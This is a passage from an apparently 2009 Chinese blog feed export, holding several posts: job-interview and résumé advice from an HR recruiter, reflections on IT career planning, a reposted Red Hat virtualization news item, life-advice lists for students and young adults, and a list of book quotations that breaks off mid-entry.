今天说在招聘面试时最需要展现什么样的能力，HR专业的说法非常复杂，什么能力模型、素质结构、职业倾向……同行之间讨论一下没问题，真拿到实际工作中，别说应聘者头晕脑涨，有时候连招人若渴的部门经理们都觉得不耐烦。</p><p>　　1、展现你不可被培训的能力</p><p>　　道理很简单，能力、素质分两种，可以培训的和难以培训的，你自己就完全可以判断。　　</p><p>　　<a href="http://softtest.chinaitlab.com/" target="_blank" rel="noopener">测试</a>：英语口语、能吃苦耐劳、诚实、善良、沟通能力，了解公司产品知识，公司所在行业熟悉程度、计算机能力、财务知识、工作主动性、协调能力、分析能力……试试看，区分一下，是不是很容易？　</p><p>　你是用人单位，你会把注意力主要放在哪儿呢？当然是不容易培训的能力！</p><p>　　公司有培训部门，要做的事情就是针对员工有所欠缺的地方进行雕琢，所以，不要怕自己在可以培训的方面有缺点（比如对公司产品知识不了解等）。而更多的是要抓住自己所应聘职位所需要的难以被培训的能力。　　</p><p>　　2、展现你不可被替代的能力</p><p>　　作为招聘者，我每天都在做选择题，在众多应聘者之间筛选出符合甚或是超出我们期望的那一个，而我每天看到的绝大多数简历都可以说是千人一面。最典型的是毕业生，英语四级（六级）、计算机二级（三级）、成绩优良（排名3/50）、连续n年获得奖学金、参加<strong>学生组织、在</strong>公司做过几个月的实习工作。这样的简历要多少有多少，换句话说，只要公司想招，随时有长龙排在门口，你成功的机会微乎其微。</p><p>　　换个角度看着问题，为什么基层员工好找，部门经理、技术专家难招呢？原因在于替代性，你越容易被替代，你的价值也就越低，这就是法则。所以无论是简历还是面试，你得把自己独特的不可替代的能力表现出来，别告诉我没有，这不可能，不然你凭什么来应聘？</p><p>第三个问题，面试成功的要诀，你的预期=我的表现</p><p>　　面试，英文叫做Interview，我认为含义完全不同。面试，当面进行考试，根据你的成绩客观给出评定，考出多少分是多少分，其目的是择优而用；interview翻译过来应该是面谈，会面，是一个沟通的过程，interviewer向应聘者就公司的业务状况，所能提供的职位详情进行传达，而candidates向对方介绍自己的履历、能力、经验等各方面信息，从而让对方认识自己，进而了解自己。其目的是双方的契合，不是择高分而用，而是提供一个机会，让双方都能找到最适合自己的合作伙伴。　</p><p>　　具体来说，interview之前，企业一定会对自己想招一个什么样的人来做这个职位分析，也就是HR理论中的所谓岗位分析（Job Description）。这个分析来源很广泛，由部门经理对这个职位的需求，有前任工作者给公司就这个职位留下的主观映像，甚至有客户对该职位人员的客观评价等不一而足。　　</p><p>　　所以，interview的结果没有所谓优秀、一般、差，只有suit or not suit。希望大家知道企业方的面试官（我们姑且沿用面试这一通行说法吧，不然有人该埋怨我说话夹杂英文了），在面试之前是带着期望来的！什么样的期望呢？简而言之，比前任更适合！如果前任做得不好，希望招到一个更好的，如果前任做得很好跳槽了，则希望招到一个更适合（稳定）的。　</p><p>　　那么怎么才能做到让自己更适合公司的期望呢？</p><p>　　1、研究对方的招聘广告，一般对方会在广告中写出职位的工作内容，任职要求。对比一下自己，如果对方写了大专以上学历，你是个硕士，就别去瞎起哄，耽误大家时间嘛这不是？如果对方写了三年以上工作经验，对方当然就不会想去从大学毕业生开始培养一个新手，基本条件都不合适，让你去面试，不是对方闲得实在无聊就是对方HR是个新来的菜鸟。</p><p>　　2、面试中注意把握对方的心态，说俗点儿，听话听音，对方一国企，做财务，问你英语水平怎么样，就得多个心眼儿，工作用不着啊，就别天花乱坠的吹一通，没准儿你的前任就是英语好跳槽去了外企！这样上当的不能说不多，反正我常碰到。</p><p>　　3、突出重点，我常碰到这样的应聘者，通常毕业一两年，会议室坐下，二话不说，从包里翻出一大堆本本，有多大桌他就能给你铺满了，英语的、会计的、贸易的、报关的、计算机的、营销的、管理的、公关的……看得我眼花，只有你想不到，没有他拿不出，介绍完了，我弱弱的问一句您应聘什么职位？答曰：”我觉得你们公司很好，外企，大品牌，心向往之不是一两年了，只要能进来，什么职位我还真不在乎！”我看他做我们总经理挺合适的……</p><p>第四个问题、面试中HR们的心态和对策</p><p>　　我们不妨从HR招聘者的职责描述说起，简而言之，为企业寻找合适的<a href="http://www.21itjob.com/job/default.aspx" target="_blank" rel="noopener">人才</a>。当然有许多限制：</p><p>　　1、时间，招聘周期按照职位高低从两周到三个月不等，平均为一个月</p><p>　　2、成本，招聘过程会发生很多成本支出，只要不是糊涂到花多少钱不在乎的地步企业一定非常关心自己招人花费几何</p><p>　　3、招聘效果，也是最重要的，你找来的人是否能够在公司里做得好，做得久，公司个人各得其所，双赢为赢嘛　</p><p>　　而这些限制本质上是矛盾的，又想招到最合适的人，又要快，又要省钱，压力当然巨大。所以，其实HR在看似怡然自得坐在面试桌另一边的时候，一般心里都处在这样的矛盾挣扎之中，一方面，心中期望自己对面坐的就是那个最佳人选，另一方面，又担心由于自己一时不慎，没看破对方小小的应试伎俩，被人结结实实的忽悠一把。</p><p>　　这就是HR面试中的心态，针对这种状况的应对措施似乎我不该多谈，表现要不要好？当然要，而且在专业领域内要在众多面试者中首屈一指，但是面试经验我劝各位还是少看些比较好，你想，如果你碰到一个经验不十分丰富的HR，他所准备的问题你都有了比他还精准的答案，HR会得出什么样的结论呢？</p><p>　　1、这人面试经验丰富，时刻准备跳槽，稳定性值得怀疑</p><p>　　2、这人性格特点看不透，有待进一步观察，看看有没有更合适的人选吧　</p><p>　　所以，回到最初的地方，面试的过程是展示，而不是去掩饰，你遮盖了一些东西，HR就会认为你有更多东西没有表现出来，进而对你整个表现的可信性产生怀疑，得不偿失啊！再说句到底的话，凭借面试经验是有可能糊弄一些半路出家的HR，可是你找到了工作事情就结束了吗？做起来发现这工作不适合你怎么办？发现工作对你的要求超出或明显地与你的能力不协调怎么办呢？最终结果还是要放弃，不如在面试时真诚沟通，让HR看透你点儿其实对你有帮助！</p><p>  第五个问题，做一块过硬的敲门砖—-简历</p><p>　　制作简历，这一步看似简单，其实也是有些窍门的　</p><p>　　三不写二多写一少写　</p><p>　　大家猜一下，HR简历筛选时，阅读你的简历会用多长时间呢？十分钟？那是我一共就这一份简历，五分钟？一般候选人在面试前他的简历会被这样研究。一分钟？那是这封简历写得挺逗。正确答案，不会超过三十秒！这是我的自身经验，同行们的意见可能更少！　</p><p>　　这么短的时间能阅读多大篇幅呢？注意我没说阅读多少字，最多两页A4。学校教育害死人呐，学生们的简历毫无例外的第一页是”求职信”。内容基本雷同，大体是大学生涯、母校光辉……除了校友和菜鸟，其他人是不会看的。你怎么才能让HR被你的简历吸引呢？切记，三不写二多写一少写！　</p><p>　　不写未成年经历，做简历不是写生平，公司选人不是政府选国家干部。一般我们对你小时候的事情兴趣不大，小学、中学就读学校之类，没人会看。很多人觉得好像写了也无关痛痒，其实不然，这样的经历一般都出现在简历开头部分，看了一段这个，会严重影响HR看下去的意志力，那就亏大了！</p><p>　　与工作本身不紧密相关的工作、学习经历不写，运气好，HR视而不见，运气不好，他们就会考虑，这个人能力挺杂啊，放我这儿不能人尽其才，来了也会跑！　</p><p>　　不写自我评价和真正意义上的兴趣爱好，自己都评价完了，HR还评价什么呢？菜鸟会觉得你傲气，有经验的则不看，写了只有坏处没好处。如果你写的是与工作相关的兴趣爱好，（比如应聘采购地说喜欢逛街购物，应聘财务的说自己酷爱数钱之类，开玩笑啊，学生朋友可别当真），那没问题，如果你写的是我爱唱卡拉OK、泡吧跳舞、打球打牌，我看算了吧。</p><p>　　直接相关的工作经历要多写，你最能吸引公司的关键能力就是这条，能不多写吗？我看得很多简历都有很好的，甚至是我公司直接竞争对手公司工作经验，但非常可惜，就一句话”从<strong><strong>到</strong></strong>在<strong><strong>公司任职</strong></strong>，证明人***”，你自己都认为你在这公司这几年的工作经验毫无亮点可说，怎么吸引别人呢？</p><p>　　成功案例数据要多写，记住一句话，事实永远比空谈有说服力，什么样的事实呢？成功案例。其实根本不用你从头到尾地把整个案例背景、困难、压力、你的措施、执行、结果都写出来，你只要提纲携领地把事件描述一下就可以了。如果能多写出两三个成功案例，你这个人的能力还不跃然纸上？尤为重要的是数据，这是最有说服力的，比如，我要应聘一家公司的招聘经理我一定会列出数据，我多少年专职招聘经验，阅读<strong>简历，组织过</strong>次面试，招聘到经理级员工<strong>，主管级</strong>，其中<strong>是通过</strong>途径招到的，等等这样的数字，很快就会让你的描述可信度大幅上升。什么？你记不得了？Faint! 你不会根据自己的情况估算一下？唉</p><p>　　参加的项目要少写，我看过不少这样的简历，作了<strong>年销售，经验丰富，业绩优良，参加广交会，做成</strong>项目，为企业创利几百万元……人才啊！赶紧回头看看薪资要求，RMB2500/month! 这人不是忽悠我吧，就算百分之一的奖金也有好几万呐！于是菜鸟说，骗人，扔！其实我知道，他确实是去参加了广交会，也正经八百的坐在了他们企业的摊位前面（旁边坐着项目负责人），生意谈下来了，说不定他还为了这笔生意拼了一回酒，闹了个现场直播呢！于是这也就成了他的经验，堂而皇之的写在了简历上。多大的误会！实在想写，您就提一句得了，记得说清楚了是参加　　</p><p>第六个问题，投递简历，电话初识，你的第一印象　</p><p>　　好了，现在我们有了一份合格吸引人的简历了，很多朋友开始满世界搜寻招聘信息，然后只要是符合自己专业或兴趣的二话不说就给他来一份，这样的简历投递方式有效吗？</p><p>　　答案是否定的！投简历的过程非常容易被忽略，认为这其实是非常细小的问题。其实不然，这是整个应聘过程中你给公司的第一印象！心理学知识告诉我们，初见简历就像我们在生活中认识一个人，第一次见面留下的印象很大程度上决定着你是否愿意跟他交谈，而你投简历最直接的目的就是希望获得面试机会，你说这是不是重要？</p><p>　　我在工作中平均每周收到几百封简历，真可谓无奇不有，说几个常见的例子吧。　</p><p>　　有不少简历居然是cc给我的！什么意思呢？我给别人投简历，应聘任家单位的职位，听说你这儿也要招人？你也看看吧，如果那家公司我谈不拢，我们可以再聊聊。还能有比这更糟糕的第一印象吗？反正我注意到很多HR都是直接click delete……就想考大学第二志愿没人要一样，找工作，一般人家也不喜欢第二志愿的！所以，一封邮件只发一封简历ok?</p><p>　　比cc好一点儿，有很多简历一眼看过去就知道不是给我一家公司的，e-mail内容整个儿一瓶红花油，哪儿都能抹。可能大家从网上找来这样的格式一看，不错，新鲜，找工作的信是这样写的啊！用了！可是，可怜可怜我们HR吧，你看了是新鲜，我们看了都要吐了，04年的时候，我记得网上出了个挺有名的求职信，你就看吧，应聘简历里面千篇一律，使用率高达33.33%，05年毕业生流行写诗，一时之间，学生诗歌蜂拥而至，有些还真是文采颇佳，读之怡情也就算了；有些打油诗，逗个乐子，还能忍受；狗皮不通的顺口溜也来凑热闹！晕啊，这又是什么样的第一印象呢？</p><p>　　所以你的简历不能是应聘大军里的一个小兵，没人会注意大海里的一滴水的！要针对对方的招聘信息适当修改简历再寄出去。内容方面前文写过了，毋庸赘述，e-mail里面至少写上，短短两句话，如：近日通过<strong>渠道，了解到贵公司正在招聘</strong>职位，窃以为本人工作经历、专业特长颇为相合，特冒昧应聘**职位云云……别看这两句话简单，立刻你就甩掉了一大批人，那些只知道重复点发送键的人，你是认真考虑了公司职位要求和自身条件才投简历的！</p><p>另一种第一印象是电话约见，一般会由HR的人来做，内容大体上就是我们看了你的简历，认为你的基本条件是符合我们职位要求的，希望你能在某日来公司参加面试……看似简单，但其实应聘者的表现也还是有高低参差之别的。　</p><p>　　接电话的技巧，不好的印象类型有三种：前倨后恭、不知所云、太过依赖。　</p><p>　　前倨后恭，中华礼仪之邦，向来是以理为先的，可是偏偏倒了现代，似乎崇礼之风日下，表现在电话这个看不见对方的场合里尤为过分。英文接电话用hello也就是你好，跟日常朋友见面打招呼的言语一样；再看我们，居然创造性的发明了个”喂”，这其实非常不礼貌，你想，谁在路上跟别人打招呼直接喊声”喂”的啊？更有甚者，这一声”喂”的语气有多种含义表达（感谢祖先发明的四声），可以表示应答、疑问，这还说得过去，还可以表示质问、挑衅、不耐烦，这给人的第一印象就不能再坏了！有点啰嗦，实际情况是这样的</p><pre><code>&quot;喂！&quot;</code></pre><p>　　我：”你好，是***吗？”</p><p>　　答：”是啊，你谁啊？”</p><p>　　我：”我是**公司的，你是不是给我们公司投了简历？我们觉得你条件不错想请你来面试。”</p><p>　　答：”噢，是的是的，不好意思，不好意思，在开会（上课，吃饭，车上，等等借口不计其数）。”</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>IT职业规划和人生价值的自我反思</title>
      <link href="/2009/12/13/it-career-planning-and-self-reflection-of-life-value/"/>
      <url>/2009/12/13/it-career-planning-and-self-reflection-of-life-value/</url>
      <content type="html"><![CDATA[<p>规划不仅是对近期工作的计划安排更主要的是对自己职业发展的一种谋略，和大多数人一样，以前我也不太明白给自己人生的发展定个 3 年、 5 年或 10 年计划有什么意义，社会变化快，信息变化快，人的心情变化也快，人的成长阅历思维方式都可能发生变化！ 3 、 5 年后我该从事现在的职业还是转行或者在目前的工作环境中究竟有多大发展都不得而知，那做这种长期的规划真的有意吗？    据科学但不完全分析， 20% 的人在 30 岁以前能明确给自己定位并找好发展方向，而这 20% 的人又仅有 20% 能在任何环境中坚持发展自己； 10% 的人在 35 岁之前能明确给自己定位并找好发展方向，而这 10% 的人又仅有 10% 能在任何环境中坚持发展自己； 5% 的人在 40 岁之前能明确给自己定位并找好发展方向，而这 5% 的人又仅有 50% 能在任何环境中坚持发展自己；若 40 岁还不知道自己该做什么，怎么做？这种人基本上属于随遇而安，得过且过之人，——而这大部分人的确在他们的一生中都不知道自己的优势在那里，自己的天赋在哪里，或者因为性格或环境原因根本不知道怎么发挥自己的优势。这不仅是个人的悲哀也是民族劣根性的悲哀。<br>    随着社会的进步和各行各业竞争的激烈现实，人若在青年时期仅仅为了生存而盲目度日，只会随着年龄的增长倍感生存的艰难，消极者更会怨天尤人、自我堕落甚至铤而走险。因此，在经历多种职业后回头反思自己的人生，我也一声叹息——人为什么总要在自己失败后才知道经验的可贵！而当现成的经验摆在面前又偏偏无动于衷。莫非就象贾平凹所言：人是永远长不大的动物，当他真的长大了，一辈子也就完了。<br>    我做过教师、化妆品销售、直销员、企业管理。不管为别人做还是为自己做，别人都觉得我是一个不错的合作者——有责任心、稳重、有创意、肯吃苦，一定会成功。而实际上我既然能从事这么多行业就表明我是很失败的，——因为我没有定位，没有明确的发展方向，只是简单的满足着自己的生存基础和所谓的存在价值而短期努力着，好象什么都可以，实际上什么都不可以；结果在一种毫无意义的满足中浪费青春。这种状况实际比表面看来毫无优势的人的发展状况可能更惨。因为这种人正是因为优势的存在认为选择的机会更大，而往往更容易错失良机。<br>    而西游记中表面最无庸的唐僧，按逻辑分析是绝对无法去西天取到真经的，但仅仅因为他的执着——对取真经这一目标的明确和坚持！才有了师徒四人的共同努力。其实，他这样就是对他职业的一个长期规划。所以我也明白，人的成功就是两点：一是正确选定目标；二是坚持实现目标。换句话说就是，做好自己的职业规划，并努力通过各种途径投资自己，让自己在实现目标中成长起来。<br>    我是在 33 岁开始对人生顿悟的，我痛恨自己年轻时的浪费，当很多朋友在比我艰难得多的情况下努力时，我还暗自庆幸；但当他们逐步获得一些成就时，我才感到自己幼稚和荒唐。 33 岁，我是在一家企业做管理时才明白自己的真正优势和天赋，现在还不晚，但我知道，我的职业规划就等于我的人生规划了，我要明确的告诉自己，明年的今天我将是什么状态； 3 年后的今天我又将如何。<br>    也奉劝那些想通过正道发展自己的人，今天就计划吧，不管你现在是如何的窘迫和艰难，只要你明白自己的优势，确定自己的发展目标，一切皆有可能。<br>    个的商业奇迹，在这些耀眼的巨星光芒中，有无数的智慧在闪烁，而这些闪烁着的智慧，折射着那些懂得如何用技术工具完成业务模式革命的“影子战士”的积累和行动。技术只是业务变革的推进动力和实现工具，能在技术层面支持用户的需求只能说“称值”，而如果能在业务层面引领用户行业进行业务变革和流程改进，那才是技术人员的“至尊境界”。当一名技术人员通过多年的业务积累，达到“一览众山小”的境界时，可能就会发现，职业和事业的发展视野，都可以打开“山外青山”的局面。职业方面可能承接对你高度认可的客户方抛来的橄榄枝，成为实至名归的行业专家，又或者拥有更大的抱负，想要以厚积而勃发的积累开创自己的事业，相信，你会感激和回味你我都曾无怨无悔地走过的IT路。</p>]]></content>
      
      <categories>
          
          <category> HR </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>新联通IDC采用红帽虚拟化全面解决方案</title>
      <link href="/2009/12/13/new-unicom-idc-uses-the-red-hat-virtualization-comprehensive-solution/"/>
      <url>/2009/12/13/new-unicom-idc-uses-the-red-hat-virtualization-comprehensive-solution/</url>
      <content type="html"><![CDATA[<p>近日，世界领先的开源解决方案供应商，红帽公司 (NYSE: RHT) 宣布国内电信运营商新联通采用了其虚拟化全面解决方案。双方此次合作是在集团总部指导下，由江西分公司上饶IDC数据中心开展，红帽的虚拟化解决方案帮助联通IDC提高了托管服务器的利用率，大幅度降低了能耗，实现了绿色、环保的功能。</p><p>红帽的虚拟化全面解决方案包括：业界领先的开源操作系统，红帽企业Linux，包含内置的虚拟化；内置的Hypervisor，支持所有的主要操作系统；可管理物理和虚拟系统的持续管理平台，可对服务器、桌面、存储和网络进行整合；定义云计算和网格管理方案；先进而高速的应用间消息通知；高可获集群方案；集成的安全架构。</p><p>红帽虚拟化项目负责人北京澳凯富汇科技发展有限公司段晶磊介绍说，采用红帽虚拟化全面解决方案后，运营商只需利用100台服务器，即可达到原来的1000台服务器的作用，意味着能耗只有以前的1/10。在投入方面，无论是硬件采购成本、能源消耗成本、软件成本和人力管理成本，都得以大大降低，为运营商节约了一大笔开支；且服务品质不降反升，托管的每台服务器均能快速响应客户的需求，不会影响服务器彼此间的应用。</p><p>重组后的新联通是国内IDC产业第二大巨头，作为国家信息化建设和互联网产业的基石，占领北方十省和南方沿海发达城市，占据全国市场份额的30%。联通IDC运营中心运营负责人康楠评价道：“我们在业务发展中一直面临的一个问题是：客户托管的服务器访问率有高有低，相当部分的服务器利用率较低。但即使在闲置不用时，大多数服务器和台式机也会消耗70-80%的额定功耗。数量众多的服务器总能耗极为惊人，造成了机房资源和电力能源的极大浪费。如何继续发展好IDC信息化的支撑能力，同时又达到国家节能减排的指标要求，红帽虚拟化全面解决方案帮助他们有效解决了“高耗、低利用率”的问题。”</p><p>作为服务北京2008奥运会固定通信服务的合作伙伴，新联通IDC将继续秉承“绿色奥运”的精神，坚持“高效低耗、绿色节能”的宗旨。此次新联通IDC与红帽的合作相当成功，按照下一步计划，将向全国四、五星级IDC数据中心全面推广红帽的虚拟化解决方案，全面实现政企客户“IT简化”的目标。</p><p>红帽大中华区总裁胡伯林介绍，红帽之所以能够在此次竞争中脱颖而出，源于红帽比专业的虚拟化厂商更为全面。红帽能够提供专有产品不能做到的优势：开放标准、真正的多厂商支持、和操作系统集成的全面方案，使得客户可以横跨整个IT基础架构部署虚拟化，在大大降低IT成本的同时，加强IT架构的灵活性和响应性。在未来的合作中，红帽将一如既往的为新联通等国内知名运营商打造最佳性价比的虚拟化全面解决方案。</p><p>转自中国通信网<a href="http://www.c114.net/news/124/a363520.html" target="_blank" rel="noopener">http://www.c114.net/news/124/a363520.html</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个25岁的总裁给大学生的18条忠告</title>
      <link href="/2009/12/13/a-25-year-old-president-gives-18-advice-to-college-students/"/>
      <url>/2009/12/13/a-25-year-old-president-gives-18-advice-to-college-students/</url>
      <content type="html"><![CDATA[<p>1.一定要有独立的人格、独立的思想。一个经过独立思考而坚持错误观点的人比一个不假思索而接受正确观点的人更值得肯定。不要成为灌输教育的牺牲品。<br>2.仕途，商界，学术。大致说来，每个人都注定要走上三条道路中的某一条。在进行职业生涯规划的时候，不妨以此作为思考的出发点。根据不同的职业生涯规划来塑造各自的核心竞争力。只有知道自己以后要做什么，才能知道自己应该学什么。<br>3.专业无冷热，学校无高低。没有哪个用人单位会认为你代表了你的学校或者你的专业。千万不要因为你是名牌大学或者热门专业而沾沾自喜，也大可不必因为你的学校不好或者专业冷门而自卑。<br>4.千招会，不如一招熟。十个百分之十并不是百分之百，而是零。如果你有十项工作每项都会做百分之十，那么，在用人单位眼中，你什么都不会。所以，你必须要让自己具备核心竞争力。“通才”只有在“专才”的基础上才有意义。<br>5.不逃课的学生不是好学生。什么课都不逃，跟什么课都逃掉没什么两样。一定要掌握学习的主动性，不要像读中学一样被老师牵着鼻子走。逃课没有错，但是不要逃错课。同时，既要逃课，又要让老师给高分。<br>6.一定要学会理财。对于贫困生来说，首先要做的不是挣钱，而是省钱。很多大学生读书的时候一掷千金，可是，毕业以后一个月的工资还不够交半个月的房租。<br>7.大部分女生将电脑当成了影碟机，大部分男生将电脑当成了游戏机。大学生要掌握必要的计算机操作能力，但是，很多时候电脑会成为浪费时间的堂而皇之的借口。有电脑的大学生非常多，可是，这中间很多人可能大学毕业的时候还不会Excel，不会做一个像样的PPT.<br>8.做事不如做人，人脉决定成败。一个人有多少钱并不是指他拥有多少钱的所有权，而是指他拥有多少钱的使用权。一个人具备多少能力，不只是说他一个人的时候能做什么，还包括他能通过别人做什么。一个人赚的钱，12.5%是靠自身的知识，87.5%则来自人脉关系。三十岁以前靠专业赚钱，三十岁以后拿人脉赚钱。所以，请好好珍惜大学期间建立起来的人脉关系。这几年你认识的朋友可能会是你毕业以后最可宝贵的财富。<br>9.互联网固然威力无穷，但是，如果你沉迷于网络聊天，或者沉迷于网络游戏，浪费的金钱倒是可以弥补，荒废的青春就无可追寻了。轻舞飞扬已经红颜薄命了，而痞子蔡却继续跟别的女孩发生着一次又一次的亲密接触。对于很多大学生而言，网吧就是一个血淋淋的黑洞。<br>10.爱情是不期而至的，可以期待，但不可以制造。花开堪折方须折，莫让鲜花败残枝。一个有一万块钱的人为你花掉一百元，你只占了他的百分之一；而一个只有十块钱的人为你花掉十块，你就成了他的全部。<br>11.研究生扩招的速度是30%，也就意味着硕士学历贬值的速度是30%。千万不要以为考研究生就是积极进取的表现。对于很多人而言，考研不过是一种消极逃避的方式罢了。对于绝大多数人而言，读研究生纯粹是浪费时间浪费金钱，立志从事科研、学术的人及其他少数人除外。<br>12.不要一门心思想着出国，更加不要迷信外国的月亮比中国圆。削尖脑袋记GRE词汇很可能是一件非常愚蠢也非常可悲的事情。既然全世界的公司都想到中国的市场上来瓜分蛋糕，为什么中国人还要一门心思到国外去留学然后给外国人打工？<br>13.人才市场就是一个地雷阵。通过多种方式求职固然没有错，但是千万不要饥不择食。只要用人单位一说要你交钱，你掉头就走便是了。<br>14.求职简历必须突出自己的核心竞争力。求职的时候大可不必像严守一那样“有一说一”，必要的时候恰到好处地说一些谎言是非常有用的。一份求职简历只要用一张A4纸做个表格就足够了。很多女生的求职简历就像是写真集，不但浪费钱，而且对求职毫无用处。面试其实是有规律的，每次面试的时候只要背标准答案就行了……<br>15.垃圾是放错位置的人才。所以，在找工作的时候一定要把自己放到那个让你成为人才而不是垃圾的职位上。当然，前提是你要知道自己究竟想做什么、究竟适合做什么。世界上最大的悲剧莫过于有太多的年轻人从来没有发现自己真正想做什么。骑驴找马固然没错，可是，并非随便找一头驴就能找到千里马。所以，一定要重视第一份工作。<br>16.大公司是做人，小公司是做事。进入公司工作以后，必须尽快融入写字楼政治。职员能否得到提升，很大程度不在于是否努力，而在于老板对你的赏识程度。在写字楼的政治斗争中，一定要学会自我保护。<br>17.瘦死的骆驼比马大。撑死胆大的，饿死胆小的。一定要有创业的勇气和魄力。如果你一只满足于给别人打工，那么，不管你工资多高，永远都只能是一个可怜的穷光蛋。就算月薪2万，在深圳上海那种地方，一年的存款还买不来一个小小的洗手间.<br>18.大学期间一定要多去图书馆多去自习室。很多书你现在不读，一辈子就再也没有机会去读了。虽然不是每本书看了都一定有用，但是，因为你不知道究竟哪本书以后会有用，所以只好多看书，并且抛弃那些过于功利的想法。尽管每次网到鱼的不过是一个网眼，但要想捕到鱼，就必须要编织一张网。<br>某扬觉得……大二了呀……是时候给自己的未来找个合适的定位了。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>一个人走向成熟的十五个标志</title>
      <link href="/2009/12/13/a-person-moves-toward-the-maturity-of-15-signs/"/>
      <url>/2009/12/13/a-person-moves-toward-the-maturity-of-15-signs/</url>
      <content type="html"><![CDATA[<p>人终要长大的。换言之，是自己慢慢学着长大。在人生的道上一步一个脚印，或深或浅记录着芸<br>芸众生成长的深度。成长越慢的人往往受得伤就会越多，面对种种伤痕我们要做的不仅仅是承受<br>，更多的是要感恩。感谢那些让你受伤的事情，忘记那些让你受伤的人，伤害也许是无意的，成<br>长却是必须的。<br>     一，当你发现自己不再盲目的喜欢跟风似的和一群人混在一起，开始尊重自己的意愿做自己<br>需要做的事情，开始安排自己的种种计划，规划自己的方向，自己的独处也变得充满意义。<br>     二，当你面对很多选择时，不再犹豫不定，脑中会很快得闪过三个以上选择某种选项的必要<br>原因。有了自己独立的思想，开始学着镇定理性得思考问题。<br>     三，当你开始觉得时间明显得不够用，渐渐的觉得睡懒觉，逛街等是相当浪费时间金钱的事<br>情，思想与行动上的时间概念达成了一致，合理的安排时间，充实的生活会把自己带入一个更喜<br>欢的世界。<br>     四，当你在上网或阅读时，会把侧重点从一味的关注娱乐杂谈转移到新闻国事，经济发展趋<br>势的版图，娱乐杂谈永远是用来开怀大笑的，而新闻国事则是提高个人认知程度关心国家发展以<br>及爱国的表现，开放的心灵开放的国度，互通有无，共同进步，闭关锁国万万不得已，经济发展<br>趋势往往会影响人们囊中银子的分量。<br>     五，当你在饮食习惯上越来越重视食物的质量，养生之道的念头闯入脑海，学着坚持吃早餐<br>，每天坚持锻炼身体。俗话说得好，留在青山在，不怕没柴烧。这个道理无人不知晓吧。<br>     六，当你再次被人问到爱情，友情，亲情三者的分量时。首先想到的应该是家中的妈妈，血<br>浓于水是千古不变的真理。<br>     七，当你再遇到不顺心的事情时不再是用哭闹来解决问题，眼泪能冲刷的永远是面容，能改<br>变现状的只有行动。<br>     八，重视自己的朋友，爱人。因为这些人不是总会存在你的生命中的，也许在不轻易间就物<br>事人非了。在他们面前你无需作假，天真无瑕的自己在这个大千世界里是为他们上演的。切忌不<br>要忘了真诚。  </p><pre><code>九，让自己快乐，让周围的人快乐。绝对比金钱有价值。  十，在面对得与失，去与留的问题上，大度与开怀会让复杂的事情变得简单，简单的事情变  </code></pre><p>得富有意义。<br>     十一，任何时候不要与老人与小孩子计较，生命的开始是无知的，生命的完结应该快乐的。  </p><pre><code>十二，学着尊重每个人每个生物，就如向日葵喜欢面对太阳才会微笑。    十三，心态，健全平和的心态是始终贯穿成功之路的筹码。正确地树立前进的目标，让生活  </code></pre><p>目标而不是在沉重氛围的度过，记住，任何时候都不要把自己搞得太累，生活的价值就完全失去<br>了。<br>     十四，自信的生活，开心的笑，成功与快乐并驾齐驱。不以物喜，不以己悲。<br>     十五，淡忘仇恨，春暖花开。心有多大，舞台就有多大。</p>]]></content>
      
      <categories>
          
          <category> 网络美文 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>100本书的100句话</title>
      <link href="/2009/12/13/100-words-for-100-books/"/>
      <url>/2009/12/13/100-words-for-100-books/</url>
      <content type="html"><![CDATA[<p>1、真正有气质的淑女，从不炫耀她所拥有的一切，她不告诉人她读过什么书，去过什么地方，有多少件衣服，买过什么珠宝，因为她没有自卑感。——《<a href="http://dengdefa.blog.163.com/blog/static/79698851200963093548279" target="_blank" rel="noopener">圆舞</a>》</p><p>2、如此情深，却难以启齿。原来你若真爱一个人，内心酸涩，反而会说不出话来，甜言蜜语，多数说给不相干的人听。——《她的二三事》</p><p>3、能够说出的委屈，便不算委屈；能够抢走的爱人，便不算爱人。——《开到荼蘼》</p><p>4、爱得不够，才借口多多。——《紫薇愿》</p><p>5、最佳的报复不是仇恨，而是打心底发出的冷淡，干嘛花力气去恨一个不相干的人——《我的前半生》</p><p>7、无论做什么，记得为自己而做，那就毫无怨言——《流金岁月》</p><p>8、如果爱一个人，千万不要与他同居或是结婚。维持一个辽阔的距离，偶遇，可以爱慕的目光致敬，轻俏温柔，不着边际地问：”好吗？”一年一次已经足够。——《绝对是个梦》</p><p>9、结婚与恋爱毫无关系，人们老以为恋爱成熟后便自然而然的结婚，却不知结婚只是一种生活方式，人人可以结婚，简单得很。爱情……完全是另外一回事。——《我的前半生》</p><p>10、两个人的适配是一种内心感觉，而不是一种视觉，千万不要因满足视觉而忽视感觉。——《花常好月常圆人长久》</p><p>11、能够哭就好，哭是开始痊愈的象征。——《绝对是个梦》</p><p>12、我的归宿就是健康与才干，一个人终究可以信赖的，不过是他自己，能够为他扬眉吐气的也是他自己，我要什么归宿？我已找回我自己，我就是我的归宿。——《<a href="http://dengdefa.blog.163.com/blog/static/79698851200963093548279" target="_blank" rel="noopener">胭脂</a>》</p><p>13、要生活得漂亮，需要付出极大忍耐，一不抱怨，二不解释，绝对是个人才。——《变形记》</p><p>14、凡事想别人感激，那是必然要失望的。——《故园》</p><p>15、我也想清楚了，婚姻根本就是那么一回事，再恋爱得轰动，三五年之后，也就烟消云散，下班后大家扭开电视一齐看长篇连续剧，人生是这样的。——《独身女人》</p><p>16、无论怎么样，一个人借故堕落总是不值得原谅的，越是没有人爱，越要爱自己。——《星之碎片》</p><p>17、做一个女人要做得像一副画，不要做一件衣裳，被男人试完了又试，却没人买，试残了旧了，五折抛售还有困难。——《喜宝》</p><p>19、人为感情烦恼永远是不值得原谅的，感情是奢侈品，有些人一辈子也没有恋爱过。恋爱与瓶花一样，不能保持永久生命。——《城市故事》</p><p>20、生命像流水，这些不快的事总要过去，如果注定一辈子要这么过，再不开心也没有用。——《<a href="http://dengdefa.blog.163.com/blog/static/79698851200963093548279" target="_blank" 